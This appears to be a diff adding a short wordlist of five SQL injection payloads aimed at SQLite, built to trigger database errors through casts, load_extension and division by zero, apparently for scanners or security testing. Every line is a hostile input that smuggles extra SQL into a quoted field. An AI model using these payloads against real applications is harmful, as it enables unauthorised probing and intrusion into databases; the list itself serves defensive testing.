@@ -1,0 +1,5 @@
+' AND CAST('SQLI_ERROR_TEST' AS int)-- -
+' AND 1=CAST(sqlite_version() AS int)-- -
+' AND load_extension('SQLI_ERROR_TEST')-- -
+' AND 1=(SELECT CAST('SQLI_ERROR_TEST' AS int))-- -
+' AND (SELECT 1/0)-- -
